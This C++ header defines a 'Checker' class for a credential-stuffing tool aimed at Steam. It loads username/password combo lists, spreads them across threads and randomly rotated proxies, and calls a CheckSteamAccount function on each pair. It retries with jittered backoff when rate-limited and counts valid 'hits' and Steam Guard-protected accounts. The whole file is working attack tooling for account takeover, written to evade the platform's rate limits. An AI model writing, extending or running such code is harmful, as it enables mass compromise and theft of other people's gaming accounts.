#pragma once
#include "types.h"
#include "steamcheck.h"
#include <atomic>
#include <thread>
#include <vector>
#include <string>
#include <functional>
#include <random>
#include <chrono>

class Checker {
public:
    using ResultFn = std::function<void(const Cred&, const CheckOutcome&)>;

    void SetCallback(ResultFn fn) { m_onResult = std::move(fn); }

    void Start(std::vector<Cred> combos, std::vector<std::string> proxies, int threads) {
        Stop();
        if (combos.empty()) return;
        m_combos = std::move(combos);
        m_proxies = std::move(proxies);
        m_total = (int)m_combos.size();
        m_next = 0;
        m_done = 0;
        m_hits = 0;
        m_guards = 0;
        m_bads = 0;
        m_errors = 0;
        m_stopFlag = false;
        m_running = true;

        int n = threads < 1 ? 1 : threads;
        if (n > (int)m_combos.size()) n = (int)m_combos.size();
        for (int i = 0; i < n; i++)
            m_threads.emplace_back([this]() { Worker(); });
    }

    void Stop() {
        m_stopFlag = true;
        for (auto& t : m_threads)
            if (t.joinable()) t.join();
        m_threads.clear();
        m_running = false;
    }

    bool Running() const { return m_running; }
    int Total() const { return m_total; }
    int Done() const { return m_done; }
    int Hits() const { return m_hits; }
    int Guards() const { return m_guards; }
    int Bads() const { return m_bads; }
    int Errors() const { return m_errors; }

private:
    void Worker() {
        std::mt19937 rng((unsigned)GetFastSeed() ^ (unsigned)std::hash<std::thread::id>{}(std::this_thread::get_id()));
        while (!m_stopFlag) {
            int idx = m_next++;
            if (idx >= m_total) break;
            Cred cred = m_combos[idx];
            CheckOutcome oc{AccStatus::Error, ""};

            for (int attempt = 0; attempt <= 3 && !m_stopFlag; attempt++) {
                std::string proxy;
                if (!m_proxies.empty())
                    proxy = m_proxies[rng() % m_proxies.size()];
                oc = CheckSteamAccount(cred.user, cred.pass, proxy);
                if (oc.status != AccStatus::Error && oc.status != AccStatus::RateLimited)
                    break;
                int base = oc.status == AccStatus::RateLimited ? 1600 : 900;
                int jitter = (int)(rng() % 600);
                std::this_thread::sleep_for(std::chrono::milliseconds(base * (attempt + 1) + jitter));
            }
            if (m_stopFlag) break;

            switch (oc.status) {
                case AccStatus::Valid: m_hits++; break;
                case AccStatus::Guard: m_guards++; break;
                case AccStatus::Invalid: m_bads++; break;
                default: m_errors++; break;
            }
            if (m_onResult) m_onResult(cred, oc);
            m_done++;
            std::this_thread::sleep_for(std::chrono::milliseconds(90 + (rng() % 140)));
        }
    }

    static unsigned GetFastSeed() {
        return (unsigned)std::chrono::steady_clock::now().time_since_epoch().count();
    }

    std::vector<Cred> m_combos;
    std::vector<std::string> m_proxies;
    std::vector<std::thread> m_threads;
    ResultFn m_onResult;
    std::atomic<int> m_next{0};
    std::atomic<int> m_total{0};
    std::atomic<int> m_done{0};
    std::atomic<int> m_hits{0};
    std::atomic<int> m_guards{0};
    std::atomic<int> m_bads{0};
    std::atomic<int> m_errors{0};
    std::atomic<bool> m_stopFlag{false};
    std::atomic<bool> m_running{false};
};
